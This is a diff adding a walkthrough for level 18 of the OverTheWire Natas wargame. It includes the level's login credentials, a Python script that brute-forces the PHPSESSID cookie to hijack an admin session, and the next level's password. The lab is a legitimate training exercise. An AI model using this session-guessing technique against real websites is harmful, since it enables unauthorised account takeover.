@@ -650,6 +650,29 @@ We get the result in some minutes.
 
         xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
+### [level 18](http://natas18.natas.labs.overthewire.org)
+
+        Username: natas18
+        Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+First, get a cookie.
+Sencond, edit the "PHPSESSID" field of the cookie to login as an admin.
+Show the python script below.
+
+        import requests
+        _cookie = requests.get('http://natas18.natas.labs.overthewire.org/?username=&password=0&debug', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')).cookies
+        for i in range(640):
+            _cookie.set('PHPSESSID',str(i))
+            r = requests.get('http://natas18.natas.labs.overthewire.org/', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=_cookie)
+            if 'You are an admin' in r.text:
+                print(r.text)
+                break
+
+We find the password in the html text.
+
+        Username: natas19
+        Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+        
 ## [narnia](http://overthewire.org/wargames/narnia/)
 
 ### level 0
